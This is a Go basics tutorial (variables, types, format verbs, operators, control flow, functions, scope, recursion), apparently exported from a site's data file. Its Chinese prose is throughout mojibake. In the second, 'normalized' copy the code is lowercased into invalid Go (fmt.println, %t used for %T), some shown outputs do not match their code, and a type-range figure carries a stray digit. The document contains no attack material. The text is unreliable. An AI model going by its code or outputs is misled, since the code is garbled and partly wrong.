args{\n\t\tfmt.Println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¦ææä»¬åªæ³ä¼ éä¸é¨ååæ°ï¼èä¸æ¯å¨é¨ï¼åå¯ä»¥ä½¿ç¨åççæ¹å¼ï¼è¿å¾pythonï¼\n\nfunc Test1(args ...int) {\n\tTest2(args[:2]...)\n}\n\nfunc Test2(args ...int) {\n\tfor _, data := range args {\n\t\tfmt.Println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå·ä½åççç¨æ³ï¼ä¼å¨åé¢æå°ã\n\n\n# å½æ°è¿åå¼\n\n# åä¸ªè¿åå¼\n\nå½æ°è¿åå¼é¡¾åæä¹å°±æ¯æ§è¡å®æå½æ°ä¹åéè¦è¿åç»è°ç¨çå¼ï¼åå¶ä»è¯­è¨ä¸­ä¸ågoè¯­è¨å¯ä»¥è¿åå¤ä¸ªè¿åå¼ãè¿åå¼çå®ä¹è¯­æ³å¦ä¸ï¼\n\nç¬¬ä¸ç§åæ³ï¼\n\nfunc Test(args ...int) int {\n\tfmt.Println("helloworld")\n\treturn 123\n}\n\n\n1\n2\n3\n4\n\n\nç¬¬äºç§åæ³ï¼\n\n// è¿ç§åæ³æ¯åå£°æäºä¸ä¸ªåé\nfunc Test(args ...int) (returnValue int) {\n\tfmt.Println("helloworld")\n\treturnValue = 123\n\treturn returnValue\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nç¬¬ä¸ç§åæ³ï¼\n\n// å ä¸ºç¬¬äºç§åæ³å®ä¹äºä¸ä¸ªåé goå·²ç»ç¥éè¦è¿åçå¼æ¯ä»ä¹äºï¼å æ­¤å¯ä»¥çç¥ã\nfunc Test(args ...int) (returnValue int) {\n\tfmt.Println("helloworld")\n\treturnValue = 123\n\treturn \n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nå¯¹äºä¸é¢çä¾å­ï¼å¯ä»¥ä½¿ç¨ä¸é¢çæ¹å¼æ¥åè¿åå¼ï¼\n\nfunc sum(args ...int) (sum int) {\n\tfor _, data := range args {\n\t\tsum += data\n\t}\n\treturn\n\n}\n\nfunc main() {\n\tresult := sum(1, 2, 3, 4)\n\tfmt.Println("result=", result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å¤è¿åå¼\n\nå¤è¿åå¼å®éä¸ååä¸ªè¿åå¼ç±»ä¼¼ï¼åªæ¯æ¥åçæ¶åä½¿ç¨å¤ä¸ªåéï¼å®ä¹çæ¶åå®ä¹å¤ä¸ªè¿åå¼å³å¯ã\n\n\n/*\n\tè®¡ç®ä¼ å¥æ°æ®çæ»å å¹³åæ°\n*/\nfunc Calc(args ...int) (sum int, div float64) {\n\tfor _, data := range args {\n\t\tsum += data\n\t}\n\tdiv = float64(sum) / float64(len(args))\n\t//div = float64(sum / len(args))\n\treturn\n\n}\n\nfunc main() {\n\tsum, div := Calc(1, 2, 3, 4)\n\tfmt.Println("sum=", sum, ",div=", div)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# å½æ°ç±»å\n\nGoè¯­è¨ä¸­è¿æå¦ä¸ç§å®ä¹åä½¿ç¨å½æ°çæ¹å¼å°±æ¯ä½¿ç¨å½æ°ç±»åï¼å½æ°ç±»åå°±æ¯å°å½æ°ä½ä¸ºä¸ç§ç±»åæ¥å®ä¹åéï¼å®ä¹çæ¹å¼å¦ä¸æç¤ºï¼\n\nfunc Sum(a int, b int) int {\n\treturn a + b\n}\n\ntype MyFunc func(a, b int) (sum int)\n\nfunc main() {\n\tvar fun MyFunc\n\tfun = Sum\n\tresult := fun(1, 2)\n\tfmt.Println(result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nåè®°ä½è¿ç§è¯­æ³ï¼å¨é¢åå¯¹è±¡ä¹åå°±è½ä½ä¼å°è¿ç§è¯­æ³çå¥å¦ä¹å¤ã\n\n\n# ä½ç¨å\n\n# å±é¨åé\n\nå±é¨åéæ¯æå¨ä¸ä¸ªå¤§æ¬å·åå®ä¹çåéï¼è¯¥åéçä½ç¨åå°±å¨è¿ä¸ªå¤§æ¬å·ä¹åãå¦ä¸æç¤ºï¼aæ¯ä¸ä¸ªå±é¨åéï¼åªå¨Teståé¨ææï¼å½æ§è¡å®Testä¹åï¼aå°±éæ¯äºã\n\nfunc Test() {\n\ta := 1\n\tb := 20\n\tfmt.Println(a, b) //1 20\n}\nfunc main() {\n\ta := 20\n\tTest()\n\tfmt.Println(a) //20\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# å¨å±åé\n\nå¨å±åéæ¯å®ä¹å¨å¨å±çåéï¼ä¹å°±æ¯å®ä¹å¨å½æ°ä¹å¤çåéï¼å¯ä»¥è¢«å¨å±çä½¿ç¨ãå¦ä¸æç¤ºï¼\n\nvar i int = 200\n\nfunc Test() {\n\ti = 100\n\tfmt.Println("i=", i) // 100\n}\n\nfunc main() {\n\tTest()\n\tfmt.Println(i) //100\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næ»ç»ï¼\n\n * å¨å½æ°å¤è¾¹å®ä¹çåéå«åå¨å±åéã\n * å¨å±åéè½å¤å¨ææçå½æ°ä¸­è¿è¡è®¿é®\n * å¦æå¨å±åéçåå­åå±é¨åéçåå­ç¸åï¼é£ä¹ä½¿ç¨çæ¯å±é¨åéçï¼å°æå·§å¼ºé¾ä¸åå°å¤´è\n\n\n# å¿åå½æ°\n\næä»¬å¨åé¢å®ä¹å½æ°çæ¶åï¼é½éè¦ç»å½æ°ä¸ä¸ªåå­ï¼å®éä¸æä»¬å¯ä»¥ä¸ç¨ç»å½æ°åå­ãå¦ä¸æç¤ºï¼\n\nfunc main() {\n\tf := func() {\n\t\tfmt.Println("helloworld")\n\t}\n\tf()\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nå®éä¸æä»¬å¨è°ç¨å¿åå½æ°æ¶å¾å¾ä½¿ç¨å¦ä¸çæ¹å¼ï¼\n\nfunc main() {\n\tfunc(a, b int) {\n\t\tfmt.Println("a+b=", a+b)\n\t}(1, 2)\n}\n\n\n1\n2\n3\n4\n5\n\n\nå½å¿åå½æ°æè¿åå¼æ¶ï¼ä¹å¯ä»¥æ¥åè¿åå¼ã\n\nfunc main() {\n\tx, y := func(a, b int) (sum, div float64) {\n\t\tsum = float64(a + b)\n\t\tdiv = sum / 2.0\n\t\treturn\n\t}(1, 2)\n\n\tfmt.Println(x, y)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# éå½å½æ°\n\néå½å½æ°å®éä¸ç®ä¸äºæ¯ä¸ç§å½æ°çç±»åï¼èæ´å¤çæ¯ä¸ç§ç®æ³ç»æï¼éå½å½æ°çæ¬è´¨å°±æ¯å½æ°èªå·±è°ç¨èªå·±ãå¦ä¸çä¾å­è®¡ç®nçé¶ä¹ï¼\n\nfunc Test(n int) (result int) {\n\tif n == 1 {\n\t\treturn 1\n\t}\n\tresult = Test(n-1) * n\n\treturn\n}\n\nfunc main() {\n\tresult := Test(4)\n\tfmt.Println(result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nä½æ¯è¿ç§æ¹å¼è½ç¶åèµ·æ¥æ¯è¾ç®ä¾¿ï¼ä½æ¯æçå¹¶ä¸é«ãå¤æ¬¡åµå¥è°ç¨ä¼å ç¨å¤§éçç³»ç»èµæºã\n\n\n# å·¥ç¨\n\n\n# æ°æ®æ ¼å¼\n\n\n# æ°ç»\n\n\n# åç\n\n\n# å­ç¬¦ä¸²\n\n\n# å­å¸Map\n\n\n# ç»æä½struct\n\n\n# æé\n\n\n# é¢åå¯¹è±¡\n\n\n# å¼å¸¸\n\n\n# ææ¬å¤ç',normalizedContent:'# goè¯­è¨åºç¡è¯­æ³\n\n\n# ç®ä»\n\ngoè¯­è¨æ¯ä¸ç§ç±»cçè¯­è¨ï¼æ§è¡æçè¾é«ï¼å¨å®å¨æ¹é¢æ¯è¾éåç¨æ¥ç¼åæ«æå¨ãæ«æéåº¦ä¼æ¯pythonå¿«ä¸å°ãåæ¶å¦ægoè¯­è¨ä¹å¯ä»¥ç¨æ¥å¼åæå¡å¨ï¼å¨é«å¹¶åçåºæ¯ä¸éåºè½åæ¯è¾å¥½ãæä»¥ä»å®å¨æ¹é¢æ¥è¯´ï¼goè¯­è¨å¼çå­¦ä¹ ï¼ä¸æ¹é¢æ¯å¼åä¸äºå·¥å·ï¼å¦ä¸æ¹é¢ï¼å¦æéå°goè¯­è¨å¼åçé¡¹ç®ï¼ä¹å¯ä»¥è¿è¡ç¸å³çä»£ç å®¡è®¡ã\n\næ³¨éï¼ä»æç®åçæ³¨éå¼å§è¯´èµ·ï¼goè¯­è¨ä¸­çæ³¨éåjavaè¯­è¨ãcè¯­è¨ä¸æ ·ãé¤äºæ²¡æjavaè¯­è¨ä¸­çææ¡£æ³¨éãå¦ä¸æç¤ºï¼\n\npackage main\n\nimport "fmt"\n\nfunc main() {\n  // åè¡æ³¨é\n  /*\n\t\tå¤è¡æ³¨é\n\t*/\n  fmt.println("hello world")\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ°æ®ç±»å\n\n\n# åé\n\nå£°æï¼goè¯­è¨ä¸­ä½¿ç¨varè¿è¡åéçå£°æï¼åéå£°æçæ ¼å¼å¦ä¸ï¼æ³¨æï¼å¨goè¯­è¨ä¸­ï¼åéå£°æä¹åå¿é¡»è¦ä½¿ç¨ã\n\nvar a int\nvar b int\nvar c, d int\nprint(a, b, c, d) // 0000\n\n\n1\n2\n3\n4\n\n\nåå§åï¼å¨å£°æåéçåæ¶ï¼å¯ä»¥å¯¹æè¿è¡åå§åï¼å¦ææ²¡æè¿è¡åå§åï¼ågoè¯­è¨ä¼ç»åéä¸ä¸ªé»è®¤çå¼ã\n\n\tvar a int = 10\n\n\n1\n\n\nèµå¼ï¼åºäºå¨å£°æåéçæ¶åå®æåéçåå§åä»¥å¤ï¼è¿å¯ä»¥å¨åéå®ä¹ä¹ååéèµå¼ï¼åå£°æåèµå¼çæ¨¡å¼ï¼\n\nvar a int\na = 10\nprint(a)\n\n\n1\n2\n3\n\n\nèªå¨æ¨å¯¼ç±»åï¼æä»¬å¨å£°æåéçæ¶åä¹å¯ä»¥ä¸æå®åéçç±»åï¼æ ¹æ®åéåé¢çèµå¼è¯­å¥ç±goèªå·±æ¨å¯¼å½ååéçç±»åï¼\n\na := "abc"\nprint(a)            // 10 +1.000000e+001 abc\nfmt.printf("%t", a) // int float64 string\n\n\n1\n2\n3\n\n\nå¤éèµå¼ï¼å½æä»¬éè¦ç»å¤ä¸ªåéèµå¼æ¶ï¼å¯ä»¥ä½¿ç¨å¤éèµå¼çæ¹å¼ãå¤éèµå¼åæ ·æ¯æèªå¨ç±»åæ¨å¯¼ã\n\na, b, c, d := 1, 1.1, "aaa", \'a\'\nfmt.println(a, b, c, d)\nfmt.printf("%t\\t%t\\t%t\\t%t\\n", a, b, c, d)\n\n//1 1.1 aaa 97\n//int     float64 string  int32\n\n\n1\n2\n3\n4\n5\n6\n\n\nå¿ååéï¼æä»¬å¯ä»¥ä½¿ç¨_å»æ¥æ¶ä¸ä¸ªæä»¬ä¸æ³è¦çåéï¼è¿ä¸ªå¨åé¢çå½æ°è°ç¨æ¥æ¶è¿åå¼çæ¶åéå¸¸æç¨ï¼è¿éè®°ä½å°±å¥½ã\n\na, _, b, _, c := 1, 2, 3, 4, 5\nfmt.println(a, b, c)\n// 1 3 5\n\n\n1\n2\n3\n\n\næå°è¾åºï¼å¨goè¯­è¨ä¸­æå¤ç§è¾åºæ¹å¼ï¼ç¬¬ä¸ç§è¾åºæ¹å¼æ¯éç¨fmt.printlnçæ¹å¼ï¼è¿ç§è¾åºä¼å°åæ°æå°åºæ¥ï¼å¹¶æ¢è¡ãè¿æä¸ç§æ¯fmt.printfè¿ç§è¾åºæ¹å¼å¯ä»¥å®ä¹è¾åºçæ ¼å¼ï¼ç±»ä¼¼äºcè¯­è¨ä¸­çprintf()ã\n\na := 10\nb := 20\nfmt.println("a=", a, ",b=", b) //a= 10 ,b= 20\n\n\n1\n2\n3\n\n\næ ¼å¼åè¾åºçç¸å³è¯­æ³åå ä½ç¬¦å¨åé¢fmtç¸å³çç« èä¸­ä»ç»ã\n\næ¥æ¶è¾å¥ï¼åºäºå¯ä»¥è¾åºåå®¹ï¼è¿å¯ä»¥ä»æ§å¶å°ä¸æ¥åç¨æ·è¾å¥çå¼ï¼å­å¨å°åéä¸­ãåcå¾åã\n\nvar age int\nfmt.scanf("%d", &age)\nfmt.println("age=", age)\n\n// 20\n//age= 20\n\n\n1\n2\n3\n4\n5\n6\n\n\nå¦å¤ä¸ç§è·åç¨æ·è¾å¥çæ¹å¼æ¯ç´æ¥ä½¿ç¨fmt.scanï¼\n\nvar age int\nfmt.scan(&age)\n\nfmt.println("age=", age)\n\n//30\n//age= 30\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æ°æ®ç±»å\n\ngoè¯­è¨ä¸­æå¤ç§æ°æ®ç±»åãå¦ä¸è¡¨æç¤ºï¼\n\nç±»å          åç§°     é¿åº¦   é¶å¼      è¯´æ\nbool        å¸å°ç±»å   1    false   å¶å¼ä¸ä¸ºçå³ä¸ºåï¼ä¸å¯ä»¥ç¨æ°å­ä»£è¡¨trueæfalse\nbyte        å­èå    1    0       uint8å«å\nint, uint   æ´å     -    0       æç¬¦å·32ä½ææ ç¬¦å·64ä½\nint8        æ´å     1    0       -128 ~ 127,\nuint8       æ´å     1    0       0 ~ 255\nint16       æ´å     2    0       -32768 ~ 32767,\nuint16      æ´å     2    0       0 ~ 65535\nint32       æ´å     4    0       -2147483648 å° 2147483647\nuint32      æ´å     4    0       0 å° 4294967295(42äº¿)\nint64       æ´å     8    0       -9223372036854775808å° 92233720368547758070\nuint64      æ´å     8    0       å° 18446744073709551615(1844äº¬)\nfloat32     æµ®ç¹å    4    0.0     å°æ°ä½ç²¾ç¡®å°7ä½\nfloat64     æµ®ç¹å    8    0.0     å°æ°ä½ç²¾ç¡®å°15ä½\nstring      å­ç¬¦ä¸²         ""      utf-8å­ç¬¦ä¸²\n\n# 1. boolç±»å\n\nè¿ä¸ªç±»åç¨äºè¡¨ç¤ºå¯¹è¿æ¯éï¼å¸¸ç¨å¨å¤æ­ä¸ãætrueåfalseä¸¤ç§å¼ã\n\n// ä½¿ç¨èªå¨æ¨å¯¼ç±»å\nb := true\nfmt.println("b=", b)\nfmt.printf("b= %t\\n", b)\n//b= true\n//b= true\n\nvar b bool\nb = false\nfmt.printf("b= %t\\n type of b is %t", b, b)\n//b= false\n// type of b is bool\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 2. æµ®ç¹ç±»å\n\nå¨goè¯­è¨ä¸­æä¸¤ç§æµ®ç¹æ°çç±»åï¼float32ãfloat64ãé»è®¤ä½¿ç¨èªå¨æ¨å¯¼ç±»åå¾å°çæ¯ä¸ä¸ªfloat64çæµ®ç¹æ°ã\n\nvar f float32\nf = 1.2\nfmt.printf("%.2f\\n", f)\n\nf2 := 1.2\nfmt.printf("f2= %f\\ntype of f2 is %t", f2, f2)\n\n//1.20\n//f2= 1.200000\n//type of f2 is float64\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 3. å­ç¬¦ç±»å\n\ngoè¯­è¨ä¸­çå­ç¬¦ç±»åå®éä¸å­å¨çæ¯å­ç¬¦çasciiç ï¼å æ­¤å¯ä»¥åæ°å­è¿è¡æ¿æ¢ãå¨å®ä¹çæ¶åä¹æ¯ä½¿ç¨çæ°å­ç±»åbyteï¼unit8ç±»åçå«åï¼ãå¦ä¸çä¾å­æç¤ºï¼\n\nvar a byte\na = \'a\'\nfmt.printf("%c\\n", a) //a\nfmt.printf("%d", a) // 97\n\n\n1\n2\n3\n4\n\n\n\n\n# 4. å­ç¬¦ä¸²ç±»å\n\nå­ç¬¦ä¸²ç±»åå®éä¸æ¯å¤ä¸ªå­ç¬¦ç±»åçè¿ç»­ï¼æ¯å­ç¬¦çæ°ç»ãå­ç¬¦ä½¿ç¨åå¼å·èå­ç¬¦ä¸²ä½¿ç¨çæ¯åå¼å·ã\n\nvar str string\nstr = "hello world"\nfmt.printf("%s", str) // hello world\n\n\n1\n2\n3\n\n\nå­ç¬¦ä¸²ç±»åä¹å¯ä»¥ä½¿ç¨scanè¾å¥ï¼\n\nvar str string\nfmt.scanf("%s", &str) //hello world haha\nfmt.println(str)  //hello\n\n\n1\n2\n3\n\n\nå¨è¾å¥çæ¶åï¼é»è®¤æ¯ä»¥ç©ºæ ¼ãæ¢è¡ä½ä¸ºåå²ç¬¦ï¼å æ­¤åªæhelloè¢«æ¥æ¶äºã\n\n# å­ç¬¦åå­ç¬¦ä¸²çåºå«\n\n 1. å­ç¬¦ä½¿ç¨åå¼å·ãå­ç¬¦ä¸²ä½¿ç¨åå¼å·\n 2. è½¬ä¹ç¬¦å·ä¹æ¯ä¸ä¸ªå­ç¬¦\n 3. å­ç¬¦ä¸²åé¢ä¼æä¸ä¸ª\\0\n\nc := \'a\'\nstr := "a"\nfmt.printf("type of c is %t\\n", c)\nfmt.printf("type of str is %t\\n", str)     \nfmt.printf("len of str is %d\\n", len(str))\nfmt.printf("str[1]: %c\\n", str[0])         \n//type of c is int32\n//type of str is string\n//len of str is 1\n//str[1]: a\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# fmtè¾å¥è¾åºçæ ¼å¼\n\nå¨ä¸é¢å¦ä»¬ä½¿ç¨å°äºfmt.printfãfmt.scanfè¾åºåè¾å¥åå®¹ï¼å¨è¿äºå¯ä»¥ä½¿ç¨ä¸äºç¹æ®çå ä½ç¬¦ï¼ç¨äºè¡¨ç¤ºä¸åçæ ¼å¼åæ°æ®ç±»åï¼å¦ä¸è¡¨æç¤ºï¼\n\næ ¼å¼   å«ä¹\n%%   ä¸ä¸ª%å­é¢é\n%b   ä¸ä¸ªäºè¿å¶æ´æ°å¼(åºæ°ä¸º2)ï¼æèæ¯ä¸ä¸ª(é«çº§ç)ç¨ç§å­¦è®¡æ°æ³è¡¨ç¤ºçææ°ä¸º2çæµ®ç¹æ°\n%c   å­ç¬¦åãå¯ä»¥æè¾å¥çæ°å­æç§asciiç ç¸åºè½¬æ¢ä¸ºå¯¹åºçå­ç¬¦\n%d   ä¸ä¸ªåè¿å¶æ°å¼(åºæ°ä¸º10)\n%f   ä»¥æ åè®°æ°æ³è¡¨ç¤ºçæµ®ç¹æ°æèå¤æ°å¼\n%o   ä¸ä¸ªä»¥å«è¿å¶è¡¨ç¤ºçæ°å­(åºæ°ä¸º8)\n%p   ä»¥åå­è¿å¶(åºæ°ä¸º16)è¡¨ç¤ºçä¸ä¸ªå¼çå°åï¼åç¼ä¸º0x,å­æ¯ä½¿ç¨å°åça-fè¡¨ç¤º\n%q   ä½¿ç¨goè¯­æ³ä»¥åå¿é¡»æ¶ä½¿ç¨è½¬ä¹ï¼ä»¥åå¼å·æ¬èµ·æ¥çå­ç¬¦ä¸²æèå­èåç[]byteï¼æèæ¯ä»¥åå¼å·æ¬èµ·æ¥çæ°å­\n%s   å­ç¬¦ä¸²ãè¾åºå­ç¬¦ä¸²ä¸­çå­ç¬¦ç´è³å­ç¬¦ä¸²ä¸­çç©ºå­ç¬¦ï¼å­ç¬¦ä¸²ä»¥\'\\0âç»å°¾ï¼è¿ä¸ª\'\\0\'å³ç©ºå­ç¬¦ï¼\n%t   ä»¥trueæèfalseè¾åºçå¸å°å¼\n%t   ä½¿ç¨goè¯­æ³è¾åºçå¼çç±»å\n%x   ä»¥åå­è¿å¶è¡¨ç¤ºçæ´åå¼(åºæ°ä¸ºåå­)ï¼æ°å­a-fä½¿ç¨å°åè¡¨ç¤º\n%x   ä»¥åå­è¿å¶è¡¨ç¤ºçæ´åå¼(åºæ°ä¸ºåå­)ï¼æ°å­a-fä½¿ç¨å°åè¡¨ç¤º\n\n\tfmt.printf("%%\\n")\n\tfmt.printf("%b\\n", 4)\n\tfmt.printf("%c\\n", 97)\n\tfmt.printf("%d\\n", 97)\n\tfmt.printf("%f\\n", 1.1)\n\tfmt.printf("%o\\n", 16)\n\tfmt.printf("%p\\n", 16)\n\tfmt.printf("%q\\n", \'1\')\n\tfmt.printf("%s\\n", "helloworld")\n\tfmt.printf("%t\\n", false)\n\tfmt.printf("%t\\n", false)\n\tfmt.printf("%x\\n", 16)\n\tfmt.printf("%x\\n", 16)\n\t\n\t//%\n\t//100\n\t//a\n\t//97\n\t//1.100000\n\t//20\n\t//%!p(int=16)\n\t//\'1\'\n\t//helloworld\n\t//false\n\t//bool\n\t//10\n\t//10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# å¸¸é\n\nåéåå¸¸éä¸åï¼åéå¨å®ä¹ååå§åä¹åï¼å¯ä»¥æ¹ååéçå¼ãèå¸¸éä¸æ¦å®ä¹å°±ä¸è½æ¹åå¼äºã\n\nvar a int\na = 10\na = 20\n\nconst b int = 20\n//b = 30 // éè¯¯\n\n\n1\n2\n3\n4\n5\n6\n\n\n**å­é¢å¸¸é **ï¼å¨ä»£ç ä¸­ç¡¬ç¼ç çå¸¸éï¼æä»¬ç»åéèµå¼æ¶å¼ãå­ç¬¦ä¸²çåå®¹ç­é½æ¯å­é¢å¸¸éã\n\n"abc"\n123\n1.1\nflase\n\n\n1\n2\n3\n4\n\n\niotaæä¸¾ iotaæä¸¾æ¯ä¸ä¸ªå¸¸éççæå¨ï¼å¯ä»¥çæä¸ç»æè§å¾çå¸¸éï¼èä¸ç¨æ¯ä¸è¡é½åä¸ä¸ªå¸¸éçåå§åè¡¨è¾¾å¼ãè¯­æ³æ¯ï¼å¨ç¬¬ä¸ä¸ªå£°æçåéæå¨çè¡ï¼iotaçå¼æ¯0ï¼æ¯å¤ä¸ä¸ªå¸¸éåå ä¸ã\n\nconst (\n  a = iota\n  b = iota\n  c = iota\n)\nfmt.println(a, b, c) // 0 1 2\n\n\n1\n2\n3\n4\n5\n6\n\n\nä¹å¯ä»¥åªåä¸ä¸ªiotaã\n\nconst (\n  a = iota\n  b\n  c\n  d\n)\nfmt.println(a, b, c, d) // 0 1 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nå¦æiotaå¨åä¸ä¸ªå±çº§ï¼åè¿ä¸è¡çå¼ä¸æ ·ã\n\nconst (\n  a       = iota\n  b, c, d = iota, iota, iota\n  e       = iota\n  f       = iota\n)\nfmt.println(a, b, c, d, e, f) // 0 1 1 1 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# è¿ç®ç¬¦\n\nä¸é¢ä¸èä»ç»äºgoè¯­è¨ä¸­å¤ç§æ°æ®ç±»åï¼è¿ä¸èæ¯ä½¿ç¨ä¸åçè¿ç®ç¬¦å¯¹ä¸é¢æå°çæ°æ®ç±»åè¿è¡è¿ç®ãæäºæä½ç¬¦è¿äºç®åï¼å¶ä»è¯­è¨ä¸­ä¹é½æç±»ä¼¼çå®ä¹ï¼è¿éå°±ä¸èµè¿°äºã\n\n# 1. ç®æ°è¿ç®ç¬¦\n\nè¿ç®ç¬¦   æ¯è¯­          ç¤ºä¾         ç»æ\n+     å            10 + 5     15\n-     å           10 - 5     5\n*     ä¹           10 * 5     50\n/     é¤           10 / 5     2\n%     åæ¨¡(åä½)      10 % 3     1\n++    åèªå¢ï¼æ²¡æåèªå¢   a=0; a++   a=1\n--    åèªåï¼æ²¡æåèªå   a=2; a--   a=1\n\n# 2. ç±»åè½¬æ¢\n\ngoè¯­è¨ä¸­ä¸åè®¸éå¼è½¬æ¢ï¼ææç±»åè½¬æ¢å¿é¡»æ¾å¼å£°æï¼å¼ºå¶è½¬æ¢ï¼ï¼èä¸è½¬æ¢åªè½åçå¨ä¸¤ç§ç¸äºå¼å®¹çç±»åä¹é´ã\n\nå¼ºå¶ç±»åè½¬æ¢çæ¹å¼ï¼æ°æ®ç±»åå(å¾è½¬æ¢çå¼)\n\nå½å¤§å®¹éçæ°æ®è½¬å°å°å®¹éçæ°æ®æ¶ä¼ä¸¢å¤±ç²¾åº¦ï¼ä¾å¦floatè½¬intä¼ä¸¢å¤±ç²¾åº¦ã\n\n# 3. èµå¼è¿ç®ç¬¦\n\nè¿ç®ç¬¦   è¯´æ       ç¤ºä¾\n=     æ®éèµå¼     c = a + b å°a + b è¡¨è¾¾å¼ç»æèµå¼ç» c\n+=    ç¸å ååèµå¼   c += a ç­ä»·äºc = c + a\n-=    ç¸åååèµå¼   c -= a ç­ä»·äºc = c - a\n*=    ç¸ä¹ååèµå¼   c *= a ç­ä»·äº c = c * a\n/=    ç¸é¤ååèµå¼   c /= a ç­ä»·äº c = c / a\n%=    æ±ä½ååèµå¼   c %= a ç­ä»·äº c = c % a\n\n# 4. å³ç³»è¿ç®ç¬¦\n\nå³ç³»è¿ç®ç¬¦éå¸¸ç¨äºæ¯è¾ä¸¤ä¸ªæ°æ®ä¹é´çå³ç³»ï¼å³ç³»è¿ç®ç¬¦çè¿ç®ç»ææ¯boolç±»åãä¸é¢æ¯å¸¸è§çä¸äºå³ç³»è¿ç®ç¬¦ã\n\nè¿ç®ç¬¦   æ¯è¯­     ç¤ºä¾       ç»æ\n==    ç¸ç­äº    4 == 3   false\n!=    ä¸ç­äº    4 != 3   true\n<     å°äº     4 < 3    false\n>     å¤§äº     4 > 3    true\n<=    å°äºç­äº   4 <= 3   false\n>=    å¤§äºç­äº   4 >= 1   true\n\n# 5. é»è¾è¿ç®ç¬¦\n\né»è¾è¿ç®ç¬¦ç¨äºå¯¹boolå¼è¿è¡è¿ç®ï¼æä¸æéä¸ç§è¿ç®ï¼å¨å¶ä»è¯­è¨ä¸­æç­è·¯ä¸ãç­è·¯æç­ï¼å¨goè¯­è¨ä¸­é»è®¤å°±æ¯ç­è·¯ä¸åç­è·¯æã\n\nè¿ç®ç¬¦   æ¯è¯­   ç¤ºä¾       ç»æ\n!     é    !a       å¦æaä¸ºåï¼å!aä¸ºçï¼ å¦æaä¸ºçï¼å!aä¸ºåã\n&&    ä¸    a && b   å¦æaåbé½ä¸ºçï¼åç»æä¸ºçï¼å¦åä¸ºåã\n||    æ    a || b   å¦æaåbæä¸ä¸ªä¸ºçï¼åç»æä¸ºçï¼äºèé½ä¸ºåæ¶ï¼ç»æä¸ºåã\n\nè¿ç®ç»æåè¡¨ï¼\n\né»è¾ä¸ï¼\n\nè¡¨è¾¾å¼1    è¡¨è¾¾å¼2    è¡¨è¾¾å¼1&&è¡¨è¾¾å¼2\ntrue    true    true\nfalse   true    false\ntrue    false   false\nfalse   false   false\n\né»è¾æï¼\n\nè¡¨è¾¾å¼1    è¡¨è¾¾å¼2    è¡¨è¾¾å¼1||è¡¨è¾¾å¼2\ntrue    true    true\ntrue    false   true\nfalse   true    true\nfalse   false   false\n\né»è¾éï¼\n\nè¡¨è¾¾å¼     !è¡¨è¾¾å¼\ntrue    false\nfalse   true\n\n# 6. å¶ä»è¿ç®ç¬¦\n\nè¿ç®ç¬¦   æ¯è¯­       ç¤ºä¾   è¯´æ\n&     åå°åè¿ç®ç¬¦   &a   åéaçå°å\n*     åå¼è¿ç®ç¬¦    *a   æéåéaææååå­çå¼\n\nåé¢å¨æéçä¹åï¼ä¼ä¸é¨ä½¿ç¨å°è¿ä¸¤ç§è¿ç®ç¬¦ã\n\n# 7. è¿ç®ç¬¦çä¼åçº§\n\nä¼åçº§   è¿ç®ç¬¦\n7     ^ !\n6     / % << >>&&^\n5     + - | ^\n4     == != < <= >= >\n3     <-\n2     &&\n1     ||\n\n\n# æµç¨æ§å¶\n\n\n# åæ¯ - éæ©\n\n# if\n\nåå¶ä»çç¼ç¨è¯­è¨ä¸æ ·ï¼å¨goä¸­å®ç°éæ©ç»æçä¹æ¯ifè¯­å¥ï¼åªä¸è¿æ ¼å¼ä¸é¢åå¶ä»çè¯­è¨ç¥æå·®å¼ãç¸æ¯èè¨ï¼goè¯­è¨ä¸­çifè¯­å¥æ¯å¶ä»è¯­è¨ä¸­çifè¯­å¥æ´å çµæ´»ã\n\n//ç¸æ¯å¶ä»è¯­è¨ä¸­æ´çµæ´»çåæ³\n// å¯ä»¥å¨å®ä¹çæ¶å å¤çåé\nif a = 10;a==10 {\n  fmt.println("a == 10")\n}\n\n\n// if else - else if\nvar score float64\nfmt.printf("è¯·è¾å¥æ¨çåæ°ï¼")\nfmt.scanf("%f", &score)\n\nif score >= 90 {\n  fmt.println("ä¼ç§")\n} else if score >= 80 {\n  fmt.println("è¯å¥½")\n} else if score >= 60 {\n  fmt.println("åæ ¼")\n} else {\n  fmt.println("ç»§ç»­åªå")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# switchç»æ\n\nswitchæä¸¤ç§è¯­æ³æ ¼å¼ï¼å¦ä¸æç¤ºï¼\n\nvar score float64\nfmt.scanf("%f", &score)\n\nswitch score {\n  case 10:\ncase 20:\n  fmt.println("20")\n  case 30:\n  fmt.println("30")\n  case 100:\n  fmt.println("nice")\n\n  default:\n  fmt.println("others")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå